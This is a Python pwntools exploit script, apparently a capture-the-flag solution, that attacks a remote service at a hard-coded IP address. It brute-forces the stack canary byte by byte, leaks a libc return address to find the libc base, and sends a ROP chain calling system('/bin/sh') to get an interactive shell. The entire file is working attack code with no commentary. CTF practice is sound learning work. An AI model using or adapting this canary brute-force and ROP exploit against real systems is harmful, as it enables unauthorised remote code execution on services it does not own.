from pwn import* 
p=remote('188.166.220.129',10001)
context.arch='amd64'
libc=ELF('./libc.so.6')
canary=b"\x00"
payload=b"A"*0x28
p.recvuntil(b"> ")
for i in range(7):
	for j in range(1,256):
		payload=flat(
			b"A"*0x28,
			canary,
			p8(j)
			)
		p.send(payload)
		if(b'*** stack smashing detected ***: terminated' not in p.recvuntil(b"> ")):
			canary+=p8(j)
			print(canary)
			break

print(canary)

###### stage2 :#################
__libc_start_main_ret=b"\x90"
#second_byte=[b"\x1d",b"\x2d",b"\x3d",b"\x4d",b"\x5d",b"\x6d",b"\x7d",b"\x8d",b"\x9d",b"\xad",b"\xbd",b"\xcd",b"\xdd",b"\xed",b"\xfd"]
for i in range(0xf):
	payload=flat(b"A"*0x28,canary,b"B"*8,__libc_start_main_ret,p8((i<<4)|0xd))
	p.send(payload)
	if (b' Segmentation fault' not in p.recvuntil(b"> ")):
		__libc_start_main_ret+=p8((i<<4)|0xd)
		print(__libc_start_main_ret)
		break

for n in range(3):
    for i in range(0x100):
        payload = flat(
            b'A'*0x28,
            canary,
            b'B'*0x8,
            __libc_start_main_ret, p8(i)
            )
        p.send(payload)

        if b'Segmentation fault' not in p.recvuntil(b'> '):
            info(f"addr_leak[{n+2}] = 0x{hex(i)[2:].rjust(2, '0')}")
            __libc_start_main_ret += p8(i)
            break


__libc_start_main_ret+=b"\x7f"
__libc_start_main_ret=int.from_bytes(__libc_start_main_ret,"little")
print(hex(__libc_start_main_ret))


libc.address=__libc_start_main_ret-(libc.sym['__libc_start_call_main']+128)#0x29d90
info("[+]Libc base:"+hex(libc.address))

pop_rdi = libc.address + 0x000000000002a3e5
ret = libc.address + 0x000000000002a3e6
payload = flat(
    b'A'*0x28,
    canary,
    b'B'*0x8,
   	ret,
    pop_rdi, next(libc.search(b'/bin/sh')),
    libc.sym['system']
    )
p.send(payload)

p.interactive()